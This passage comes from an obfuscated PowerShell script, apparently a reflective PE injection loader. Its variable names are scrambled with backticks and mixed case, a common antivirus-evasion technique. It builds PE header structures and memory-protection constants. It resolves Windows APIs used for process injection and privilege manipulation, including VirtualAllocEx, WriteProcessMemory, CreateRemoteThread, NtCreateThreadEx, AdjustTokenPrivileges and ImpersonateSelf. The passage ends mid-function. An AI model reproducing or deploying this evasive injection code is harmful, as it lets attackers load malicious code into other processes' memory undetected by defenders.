        ${iMAgE`_sec`Ti`On`_heaD`eR} = ${Ty`P`E`BUILDEr}.CreateType()
        ${wi`N`3`2TYPeS} | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${I`MAg`E_`s`Ection_`He`AdER}

        
        ${atT`RiB`UtES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${tYPeBU`IL`d`eR} = ${moDUL`E`B`UIlD`ER}.DefineType('IMAGE_BASE_RELOCATION', ${a`TTRI`Bu`Tes}, [System.ValueType], 8)
        ${TypEB`U`ildEr}.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        ${T`YP`EbU`ILder}.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        ${I`mAge_Base`_R`el`oCatION} = ${ty`p`EBuILDER}.CreateType()
        ${WIn32`T`YP`es} | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${IMA`GE_b`As`e_ReLO`CA`T`iOn}

        
        ${A`TtRib`UTES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${Typ`eBuI`Ld`ER} = ${m`o`Du`lebuILDEr}.DefineType('IMAGE_IMPORT_DESCRIPTOR', ${a`TTr`IbuTEs}, [System.ValueType], 20)
        ${tyP`e`Bu`ilDer}.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        ${tYPeb`UIlD`eR}.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        ${tYp`e`BU`ILDEr}.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        ${TYpeBu`I`LDEr}.DefineField('Name', [UInt32], 'Public') | Out-Null
        ${T`yP`e`BUIldeR}.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        ${IMAgE_i`mpORt`_`DES`C`R`IPtoR} = ${T`YpEB`Uil`DeR}.CreateType()
        ${W`I`N32tY`pes} | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${iMA`Ge_Im`Po`Rt_de`sCr`i`pToR}

        
        ${ATTRibu`T`Es} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${ty`pEBU`Ild`eR} = ${ModuLeB`UIL`D`ER}.DefineType('IMAGE_EXPORT_DIRECTORY', ${ATt`RI`BuTes}, [System.ValueType], 40)
        ${Ty`PE`BUiL`DEr}.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        ${TYPe`BUiL`D`Er}.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        ${tYPeBUil`d`ER}.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        ${TYpEbu`I`lDER}.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        ${T`YpeBuI`LdER}.DefineField('Name', [UInt32], 'Public') | Out-Null
        ${t`YP`ebUI`lDeR}.DefineField('Base', [UInt32], 'Public') | Out-Null
        ${TYp`Eb`Ui`lder}.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        ${tYpe`BU`iLD`eR}.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        ${Ty`PE`BUIldeR}.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        ${TYpeb`Ui`ldEr}.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        ${TY`pEbuI`l`DER}.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        ${im`A`Ge_ExpO`R`T_D`I`R`ECtOry} = ${tyP`eBuIL`dEr}.CreateType()
        ${wiN`32Typ`ES} | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${IMa`GE_eXPO`RT_`DiREctory}

        
        ${ATt`RI`BU`TeS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${Ty`pebU`IlDer} = ${mODULe`Bu`I`lDEr}.DefineType('LUID', ${ATtRIb`U`TeS}, [System.ValueType], 8)
        ${ty`peBuILd`ER}.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        ${Ty`PebUi`lDeR}.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        ${LU`iD} = ${T`YPebU`iLDer}.CreateType()
        ${w`In32`T`yPeS} | Add-Member -MemberType NoteProperty -Name LUID -Value ${l`UiD}

        
        ${ATT`Ri`BU`TEs} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${tYPEBU`Il`DeR} = ${MOD`U`l`E`BuildER}.DefineType('LUID_AND_ATTRIBUTES', ${ATTRi`B`U`TES}, [System.ValueType], 12)
        ${tYP`Eb`U`IldeR}.DefineField('Luid', ${l`UID}, 'Public') | Out-Null
        ${tY`p`Ebuil`Der}.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        ${LU`iD_AN`d_a`TtRIb`UtEs} = ${TY`PEb`UIlDeR}.CreateType()
        ${wIn32`TY`peS} | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${LUiD_And`_a`T`Tribu`TEs}

        
        ${ATtri`But`es} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${TY`pE`BUiLdeR} = ${m`O`DuLEbui`LdeR}.DefineType('TOKEN_PRIVILEGES', ${A`TtR`i`BUTEs}, [System.ValueType], 16)
        ${tY`p`EBuild`eR}.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        ${tYpEBU`i`l`Der}.DefineField('Privileges', ${luID_AND_at`Tri`B`U`T`eS}, 'Public') | Out-Null
        ${TOk`E`N_prIvil`eGES} = ${Ty`PeBu`Ilder}.CreateType()
        ${Win3`2`T`yPeS} | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${tO`KeN_Pr`I`V`ILEgeS}

        return ${W`iN32T`Yp`ES}
    }

    Function Get-Win32Constants
    {
        ${Win32`c`o`NST`AnTs} = New-Object System.Object

        ${WI`N32`coNsTantS} | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        ${wIN3`2cO`N`S`TANTS} | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        ${w`In`32`COnstaNtS} | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        ${WIn32`c`ons`TANtS} | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        ${WIN32Con`s`TANtS} | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        ${w`In32cONSt`ANTs} | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        ${w`In`32co`Ns`TaNTs} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        ${Wi`N32c`oNsTaN`Ts} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        ${W`i`N32cON`st`ANTs} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        ${W`in3`2Con`StAntS} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        ${WIN32`cOn`STaN`Ts} | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        ${wi`N3`2c`oNstaNtS} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        ${w`iN3`2`Co`NStaNts} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        ${WIn32C`ON`Stan`Ts} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        ${W`in32CoNSt`A`NtS} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        ${Win32`cONstA`N`TS} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        ${win3`2CoNs`TA`N`TS} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        ${win32Co`Ns`TaN`Ts} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        ${wiN`32`cons`TANTs} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        ${W`IN32cONSt`A`NTs} | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        ${WIn3`2cOnSt`AntS} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        ${WIn`32cO`NST`AntS} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        ${W`i`N32CoNs`TaNTs} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        ${W`iN3`2`cOnSTANts} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        ${WI`N3`2ConSTA`NtS} | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        ${wIn`32cO`NSt`Ants} | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        ${wiN`32C`onSTA`NTS} | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        ${wIN3`2cO`NS`TAnTS} | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        ${wIN32cONS`TA`Nts} | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return ${WIn3`2CO`NSta`N`TS}
    }

    Function Get-Win32Functions
    {
        ${w`i`N32`FUnCTionS} = New-Object System.Object

        ${vi`Rtualal`l`OCad`DR} = Get-ProcAddress kernel32.dll VirtualAlloc
        ${vI`RtuaLal`lOCDEL`eGATE} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        ${v`ir`Tua`LAllOc} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${viRtualalL`o`c`AD`dr}, ${V`ir`TuAlaL`LOc`D`eL`EGatE})
        ${wI`N`32FU`NctI`onS} | Add-Member NoteProperty -Name VirtualAlloc -Value ${vi`RTuA`lALLoC}

        ${vir`TU`AlA`LLoce`xAD`Dr} = Get-ProcAddress kernel32.dll VirtualAllocEx
        ${Vi`R`TuALa`lLoCeX`D`eL`e`GAtE} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        ${VIRtu`A`LALLO`c`ex} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vIR`Tu`ALA`L`loCEXA`ddR}, ${Vi`RTUAl`ALLoC`eXde`LE`g`ATE})
        ${Wi`N32f`U`NCTioNS} | Add-Member NoteProperty -Name VirtualAllocEx -Value ${vI`R`TualallO`CEx}

        ${MeMC`pYA`d`Dr} = Get-ProcAddress msvcrt.dll memcpy
        ${M`Emc`PY`DE`LEGAtE} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        ${M`Em`cpY} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${M`eMC`PYAd`dr}, ${mem`CpY`d`ElEGATE})
        ${Wi`N32F`U`NCTIOnS} | Add-Member -MemberType NoteProperty -Name memcpy -Value ${m`EMCPy}

        ${ME`MsETA`D`dr} = Get-ProcAddress msvcrt.dll memset
        ${m`EMSEtD`EL`EgA`Te} = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        ${MEmS`eT} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${meMs`et`Ad`dr}, ${mE`mse`Td`eLEg`AtE})
        ${win32fu`N`CTi`o`NS} | Add-Member -MemberType NoteProperty -Name memset -Value ${Me`M`SET}

        ${LOAdl`IBr`AryADDr} = Get-ProcAddress kernel32.dll LoadLibraryA
        ${LOaDLi`BrAr`YD`el`EGa`Te} = Get-DelegateType @([String]) ([IntPtr])
        ${LoaDLi`B`RARY} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${L`OADli`Bra`Ryaddr}, ${lOADLIbr`A`RyD`eLEgate})
        ${w`IN3`2fu`NC`TIOns} | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${Lo`AdlI`BR`Ary}

        ${getpROcaD`d`REss`ADDR} = Get-ProcAddress kernel32.dll GetProcAddress
        ${Ge`Tp`ROcaD`Dr`essd`ELeGA`Te} = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        ${g`E`TP`ROcadDReSs} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${gEtP`RO`caDdRESsa`Ddr}, ${GET`PrOC`AD`D`REsSDeLegatE})
        ${WiN`32F`UNCTIo`NS} | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${gEt`PR`oc`ADDrEss}

        ${gETP`ROCaDDRE`S`Si`NTPtRadDr} = Get-ProcAddress kernel32.dll GetProcAddress 
        ${GeTP`R`o`c`AdDReSSIntptrD`e`LeGATe} = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        ${g`ET`p`ROca`dDR`eSsINT`ptR} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ge`TpROcaD`D`R`eSSiNtPT`RaD`dR}, ${GeTp`Ro`CADDRes`SiNtp`T`R`dEL`EgA`TE})
        ${WIn3`2f`UnctIO`Ns} | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${GE`T`pr`Oc`AdDreSSINtpTr}

        ${V`iRtu`AlFREea`ddR} = Get-ProcAddress kernel32.dll VirtualFree
        ${VI`RTuaLFrEedE`leg`AtE} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        ${VI`RTUAl`FREe} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vIRTUaLFr`EeA`d`DR}, ${Vir`TuaLF`R`ee`dELe`G`ATe})
        ${win32`FUnCTIo`Ns} | Add-Member NoteProperty -Name VirtualFree -Value ${v`i`RtuAlF`REe}

        ${VI`RTUaL`Fre`EEXADDr} = Get-ProcAddress kernel32.dll VirtualFreeEx
        ${ViR`T`U`A`lFreEEXde`LEG`AtE} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        ${vIRtUA`l`Fr`EEEX} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vIrTuaLfRe`EEx`A`DDR}, ${vIR`Tu`Alfreee`Xd`Ele`gAte})
        ${wIn32`FUNcT`i`Ons} | Add-Member NoteProperty -Name VirtualFreeEx -Value ${VIRTua`L`Fr`eEEX}

        ${V`I`Rtu`Al`pROTecTADdr} = Get-ProcAddress kernel32.dll VirtualProtect
        ${Vi`RtUA`lpRO`TEctDE`legatE} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        ${V`iRtU`AL`P`ROTeCt} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${V`IrtuAlpRoTEC`T`A`ddr}, ${v`IRTUALPro`T`EcTd`eLegaTe})
        ${wi`N32Fu`N`cTiONs} | Add-Member NoteProperty -Name VirtualProtect -Value ${vIrTU`AlPrOt`EcT}

        ${G`ETMODUL`Eha`N`D`LeAddr} = Get-ProcAddress kernel32.dll GetModuleHandleA
        ${ge`Tm`oDulEHa`ND`lede`LEg`A`Te} = Get-DelegateType @([String]) ([IntPtr])
        ${GETM`odU`lEH`ANd`Le} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${g`e`TMOdULEhAN`d`L`EaD`DR}, ${GETMODULehan`Dle`D`El`EG`AtE})
        ${WI`N32FUN`ctI`OnS} | Add-Member NoteProperty -Name GetModuleHandle -Value ${G`E`TmOdu`lEHaN`DLE}

        ${F`ReelI`Br`ARyAdDR} = Get-ProcAddress kernel32.dll FreeLibrary
        ${fREe`l`Ib`R`ArYdELEGATe} = Get-DelegateType @([IntPtr]) ([Bool])
        ${fre`E`liBRarY} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${f`R`EE`LIBRAR`ya`Ddr}, ${fre`ElI`Br`ARydELegA`Te})
        ${Wi`N32`F`UNctIo`Ns} | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${FrEe`LIbra`RY}

        ${opE`Np`Roces`SADDr} = Get-ProcAddress kernel32.dll OpenProcess
        ${OpENp`RoC`e`SSDE`lEGatE} = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${oPEnp`Ro`ceSs} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${O`Pen`PRo`CES`SADdr}, ${o`peNPR`OCeSS`d`eLE`G`Ate})
        ${wIn3`2fU`Nc`TioNS} | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${O`penpR`oCesS}

        ${wAITF`oRsin`gle`O`Bjectad`Dr} = Get-ProcAddress kernel32.dll WaitForSingleObject
        ${WaItForSIn`GLEobjEc`T`De`L`E`gATE} = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        ${waIt`FO`RSiN`g`LEObjecT} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${wa`it`FoRsiN`gle`OBJECt`AD`Dr}, ${wa`I`TF`OrSiN`Gle`O`B`JEctDE`LegATE})
        ${Win`32F`UNC`T`IONS} | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${wa`I`TforsIn`g`LeO`BJE`cT}

        ${W`Ri`TePRoce`ssM`EmORY`A`d`Dr} = Get-ProcAddress kernel32.dll WriteProcessMemory
        ${w`RiTeP`ROcEsS`M`e`MoR`YDelEg`A`TE} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${w`RiTe`P`RoCEs`sMEMory} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${WRitEpRoc`e`SsmE`mo`Ry`A`d`Dr}, ${wR`i`TeP`Rocessm`e`MO`R`YDELEgA`TE})
        ${wi`N32F`U`NCt`IonS} | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${w`RiT`EP`RoCesS`MeM`ory}

        ${Re`A`dPROcESsmEM`or`yaddR} = Get-ProcAddress kernel32.dll ReadProcessMemory
        ${r`eADprOCEsSmeMOry`DeleG`A`TE} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${Re`ADPrOCEsS`m`emOry} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${R`EAdp`R`oce`s`sMemorYA`ddr}, ${REadp`ROcESsMeM`o`RYDEL`EGaTE})
        ${W`in32`FUnCTio`NS} | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${rEadp`RoCessme`mO`RY}

        ${Cr`EaTEreMotETh`RE`A`DADDR} = Get-ProcAddress kernel32.dll CreateRemoteThread
        ${Cr`eA`TerE`MOtETH`REaDdELe`G`ATE} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CRe`ATeREmo`T`eTh`R`eAd} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${CrE`A`TErE`mOtetH`READ`A`dDR}, ${CReAte`REMOtethreaD`d`E`l`eGatE})
        ${WI`N`32Fu`NcTI`Ons} | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${cR`e`ATE`Rem`OteThr`EAd}

        ${GeteXiT`CoD`eTHRe`A`DAD`Dr} = Get-ProcAddress kernel32.dll GetExitCodeThread
        ${GeTex`i`TCOd`ethre`ADde`leG`ATe} = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${gE`TEXIT`Co`DE`Thread} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${Gete`XitCo`de`Th`R`EadA`DDR}, ${Get`ExitC`ODe`THreAdde`le`gATe})
        ${Wi`N`32FuNCTiONs} | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${G`eTExi`T`C`odeThrEad}

        ${oPE`N`TH`ReaD`T`OkENA`Ddr} = Get-ProcAddress Advapi32.dll OpenThreadToken
        ${OpeNTHrEA`DTOKE`Nd`E`LE`g`AtE} = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${Op`E`NthREa`dTOk`eN} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${OpE`Nt`HrEAd`TOk`enadDr}, ${O`pEn`ThR`eADtOK`ENdE`LEG`Ate})
        ${Wi`N`32fun`C`TiONS} | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${opE`N`Thre`ADto`KEN}

        ${geT`CuRRe`N`TT`hREAd`ADDr} = Get-ProcAddress kernel32.dll GetCurrentThread
        ${G`etC`UR`REntTHREADD`e`L`Eg`ATE} = Get-DelegateType @() ([IntPtr])
        ${Ge`T`CU`RreNTt`hrEaD} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${GeT`cUr`R`EnTTHReAD`Addr}, ${gETcUR`RENTtHrEa`DdelE`GA`Te})
        ${WIn32FuncT`I`o`Ns} | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${g`eTCurReNtT`hr`EAd}

        ${aDJ`USTtok`EN`pRi`Vilege`SAd`Dr} = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        ${ADjusTtOkE`Npr`iV`i`LEG`EsdeleGAte} = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${A`d`ju`STToke`NpRiV`Ile`GES} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${AdJustTO`K`EnPRivIlE`gE`Sad`dr}, ${AdjUsttokE`Np`Ri`ViLEgESD`E`leGaTe})
        ${W`In32FuN`c`T`Ions} | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${a`dj`US`TTOke`Npr`iVILEGeS}

        ${loOK`UpPr`ivI`LEGe`VAl`UeA`dDr} = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        ${LOO`kUpPr`I`ViL`egE`VALu`ed`elegAtE} = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        ${looKupPr`IViL`egE`V`A`luE} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${Loo`KUP`p`RiV`iLEGevAl`UeADdR}, ${Loo`k`UPpRI`VIlEG`eval`UEd`ElE`GA`Te})
        ${win3`2FUN`c`TI`ONS} | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${LoOKupp`RI`VilE`geVA`lue}

        ${IM`p`ErS`o`N`AtES`eLFADdR} = Get-ProcAddress Advapi32.dll ImpersonateSelf
        ${Impe`RSON`ATese`LFdeL`EG`ATE} = Get-DelegateType @([Int32]) ([Bool])
        ${i`mpERs`on`ATeS`ELf} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${iMP`ErSON`Atese`Lfaddr}, ${iM`p`ERSoNaT`ESe`LfdELeGA`TE})
        ${Win32`F`Un`CTIo`NS} | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${IMPe`R`s`OnaTEsELF}

        
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            ${nTcrEAteTHrEa`d`eX`Addr} = Get-ProcAddress NtDll.dll NtCreateThreadEx
            ${Nt`crE`ATE`THR`E`ADE`xdelEga`Te} = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${nT`cREAT`eT`HREAd`ex} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${nTCrE`AT`ethr`e`A`DEXADDr}, ${n`T`CreaTEThReA`D`EXDELE`gA`TE})
            ${wi`N32`F`UnctI`Ons} | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${NT`cr`ea`TetH`READ`ex}
        }

        ${I`Sw`OW`64PrOceSs`A`DDR} = Get-ProcAddress Kernel32.dll IsWow64Process
        ${IswoW64`prO`CessDEleG`A`TE} = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${ISWoW`6`4pROceSS} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${Iswow64`P`R`oCESsadDr}, ${IsWo`W64PROC`Essd`eLeG`AtE})
        ${win3`2FU`NCtiOns} | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${ISwoW64P`R`oc`e`SS}

        ${c`ReaT`ethre`A`dAddr} = Get-ProcAddress Kernel32.dll CreateThread
        ${Cr`Eat`EtH`REa`dDELeGAte} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${cr`eatet`h`REad} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${cRea`Tet`hRE`A`dAddr}, ${CRe`ATEThR`EAdde`lEG`ATe})
        ${WIn3`2fU`NCti`O`NS} | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${cReaT`EtHr`EAd}

        return ${w`IN`32fUN`ctiOns}
    }
    


    
    
    

    
    
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${tr`Ue})]
        [Int64]
        ${VA`lUE1},

        [Parameter(Position = 1, Mandatory = ${Tr`Ue})]
        [Int64]
        ${va`L`UE2}
        )

        [Byte[]]${VAL`Ue1`BytES} = [BitConverter]::GetBytes(${vA`luE1})
        [Byte[]]${VALUe`2By`T`ES} = [BitConverter]::GetBytes(${v`Alue2})
        [Byte[]]${fiN`Al`B`YtES} = [BitConverter]::GetBytes([UInt64]0)

        if (${va`lu`e1B`yTEs}.Count -eq ${Va`LUe`2bY`TES}.Count)
        {
            ${carR`YOv`Er} = 0
            for (${i} = 0; ${i} -lt ${vaL`Ue1Byt`eS}.Count; ${i}++)
            {
                ${V`AL} = ${VA`lUe`1bytES}[${I}] - ${CArR`y`O`VEr}
                
                if (${V`Al} -lt ${VALu`E2BYt`ES}[${I}])
                {
                    ${V`Al} += 256
                    ${CA`RRY`OVEr} = 1
                }
                else
                {
                    ${cA`Rryov`ER} = 0
                }

                [UInt16]${S`UM} = ${v`Al} - ${VAL`U`E2bY`TeS}[${I}]

                ${fINaL`B`Yt`es}[${i}] = ${S`UM} -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64(${FI`NalbYT`ES}, 0)
    }

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${T`Rue})]
        [Int64]
        ${v`A`lue1},

        [Parameter(Position = 1, Mandatory = ${tr`UE})]
        [Int64]
        ${V`A`lue2}
        )

        [Byte[]]${val`UE1BY`TeS} = [BitConverter]::GetBytes(${VAL`UE1})
        [Byte[]]${VaLuE`2`BytEs} = [BitConverter]::GetBytes(${vAlu`e2})
        [Byte[]]${fIn`Alb`YT`ES} = [BitConverter]::GetBytes([UInt64]0)

        if (${V`ALU`e1byteS}.Count -eq ${Val`UE`2bY`TeS}.Count)
        {
            ${c`ARRyo`VEr} = 0
            for (${I} = 0; ${I} -lt ${VAl`UE`1bytes}.Count; ${I}++)
            {
                
                [UInt16]${S`Um} = ${VA`LU`E1BYTES}[${I}] + ${VaL`UE2b`Y`Tes}[${I}] + ${cA`RryO`VEr}

                ${fI`NAL`BYtES}[${i}] = ${S`UM} -band 0x00FF

                if ((${S`UM} -band 0xFF00) -eq 0x100)
                {
                    ${c`ARr`y`Over} = 1
                }
                else
                {
                    ${c`A`RrYoVER} = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64(${F`i`NAlbYT`ES}, 0)
    }

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${T`Rue})]
        [Int64]
        ${Va`LU`E1},

        [Parameter(Position = 1, Mandatory = ${t`Rue})]
        [Int64]
        ${V`AlU`e2}
        )

        [Byte[]]${V`ALue1by`T`es} = [BitConverter]::GetBytes(${va`LuE1})
        [Byte[]]${VAL`UE2byt`eS} = [BitConverter]::GetBytes(${V`AL`Ue2})

        if (${ValU`e1bY`Tes}.Count -eq ${Value`2b`yTes}.Count)
        {
            for (${i} = ${v`AL`UE1B`YteS}.Count-1; ${i} -ge 0; ${I}--)
            {
                if (${vAlUE`1BY`T`Es}[${I}] -gt ${va`l`Ue2BYtEs}[${i}])
                {
                    return ${tr`Ue}
                }
                elseif (${va`lue1ByT`Es}[${i}] -lt ${VAl`Ue2bY`T`Es}[${I}])
                {
                    return ${f`A`Lse}
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return ${fa`lSE}
    }


    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${tr`Ue})]
        [UInt64]
        ${VA`l`UE}
        )

        [Byte[]]${VAlU`EB`YT`es} = [BitConverter]::GetBytes(${vAl`UE})
        return ([BitConverter]::ToInt64(${VA`LueB`yTes}, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${TR`Ue})]
        ${vAL`Ue} 
